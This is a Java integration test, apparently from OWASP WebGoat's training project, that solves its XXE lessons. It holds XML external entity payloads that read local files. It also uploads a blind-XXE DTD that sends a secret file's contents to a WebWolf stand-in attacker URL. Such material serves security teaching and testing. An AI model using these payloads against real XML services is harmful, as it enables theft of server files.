package org.owasp.webgoat;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import org.hamcrest.CoreMatchers;
import org.junit.Assert;
import org.junit.Test;

import io.restassured.RestAssured;
import io.restassured.http.ContentType;

public class XXETest extends IntegrationTest {

    private static final String xxe3 = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \"file:///\">]><comment><text>&xxe;test</text></comment>";
    private static final String xxe4 = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \"file:///\">]><comment><text>&xxe;test</text></comment>";
    private static final String dtd7 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"file://SECRET\"><!ENTITY % all \"<!ENTITY send SYSTEM 'WEBWOLFURLlanding?text=%file;'>\">%all;";
    private static final String xxe7 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE comment [<!ENTITY % remote SYSTEM \"WEBWOLFURL/USERNAME/blind.dtd\">%remote;]><comment><text>test&send;</text></comment>";
    
    private String webGoatHomeDirectory = System.getProperty("user.dir").concat("/target/.webgoat");
    private String webwolfFileDir = System.getProperty("user.dir").concat("/target/webwolf-fileserver");
    
    
    @Test
    public void runTests() throws IOException {
        startLesson("XXE");
        
        checkAssignment(url("/WebGoat/xxe/simple"),ContentType.XML,xxe3,true);
        checkAssignment(url("/WebGoat/xxe/content-type"),ContentType.XML,xxe4,true);
        Path webWolfFilePath = Paths.get(webwolfFileDir);
        if (webWolfFilePath.resolve(Paths.get(getWebgoatUser(),"blind.dtd")).toFile().exists()) {
        	System.out.println("delete file");
        	Files.delete(webWolfFilePath.resolve(Paths.get(getWebgoatUser(),"blind.dtd")));
        }
        String secretFile = webGoatHomeDirectory.concat("/XXE/secret.txt");
        String dtd7String = dtd7.replace("WEBWOLFURL", webWolfUrl("")).replace("SECRET", secretFile);
        System.out.println(dtd7String);
        RestAssured.given()
        .when()
        .config(restConfig)
        .cookie("WEBWOLFSESSION", getWebWolfCookie())
        .multiPart("file", "blind.dtd", dtd7String.getBytes())
        .post(webWolfUrl("/WebWolf/fileupload"))
        .then()
        .extract().response().getBody().asString();
        
        
        String xxe7String = xxe7.replace("WEBWOLFURL", webWolfUrl("/WebWolf/files")).replace("USERNAME", getWebgoatUser());
        System.out.println(xxe7String);
        checkAssignment(url("/WebGoat/xxe/blind?send=test"),ContentType.XML,xxe7String,false );
        
        //checkResults("/XXE/");
    
    }
    
    public void checkAssignment(String url, ContentType contentType, String body, boolean expectedResult) {
        Assert.assertThat(
                RestAssured.given()
                        .when()
                        .config(restConfig)
                        .contentType(contentType)
                        .cookie("JSESSIONID", getWebGoatCookie())
                        .body(body)
                        .post(url)
                        .then()
                        .log().all()
                        .statusCode(200)
                        .extract().path("lessonCompleted"), CoreMatchers.is(expectedResult));
    }
    
}
